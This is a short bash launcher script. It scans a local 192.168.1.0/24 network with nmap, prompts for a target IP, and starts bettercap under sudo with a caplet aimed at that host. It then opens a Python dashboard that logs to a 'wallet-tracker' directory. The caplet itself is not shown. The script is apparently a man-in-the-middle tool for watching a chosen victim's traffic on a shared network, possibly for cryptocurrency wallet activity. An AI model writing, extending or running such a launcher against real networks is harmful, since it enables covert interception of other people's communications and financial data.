#!/bin/bash
TARGET_IP=${1:-"SCAN"}
INTERFACE=${2:-$(ip route | grep default | awk '{print $5}')}

if [ "$TARGET_IP" = "SCAN" ]; then
    echo "🔍 Scanning network..."
    nmap -sn 192.168.1.0/24 | grep -oE '192\.168\.[0-9]+\.[0-9]+' | head -5
    read -p "Enter target IP: " TARGET_IP
fi

echo "🎯 Targeting: $TARGET_IP on $INTERFACE"
sudo bettercap -iface $INTERFACE -caplet src/bettercap_script.cap --args "target:$TARGET_IP" &
sleep 3
python3 src/dashboard.py $TARGET_IP $INTERFACE &
echo "✅ Dashboard open | Logs: /opt/wallet-tracker/logs/"
